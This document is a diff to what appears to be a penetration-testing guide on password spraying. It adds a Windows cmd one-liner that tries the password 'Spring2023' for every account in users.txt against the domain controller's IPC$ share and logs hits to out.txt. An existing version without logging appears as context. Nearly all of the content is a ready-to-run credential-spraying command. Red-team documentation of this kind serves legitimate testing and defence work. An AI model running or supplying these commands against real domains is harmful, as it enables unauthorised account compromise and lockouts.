@@ -84,3 +84,9 @@ This example uses a password of `Spring2023` against a list of users called **us
 ```cmd
 @FOR /F "delims=" %n in (users.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "Spring2023" 1>NUL 2>&1 && @echo [*] %n:Spring2023 && @net use /delete %logonserver%\IPC$ > NUL
 ```
+
+Or, if you want to send the output to a file so that you have a record of how far you got through the spray and what user passwords you guessed, you can use the following which will write the output to a file called **out.txt**.
+
+```cmd
+@FOR /F "delims=" %n in (users.txt) DO @echo %n >> out.txt && @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "Spring2023" 1>NUL 2>&1 && @echo [*] %n:Spring2023 >> out.txt && @net use /delete %logonserver%\IPC$ > NUL
+```
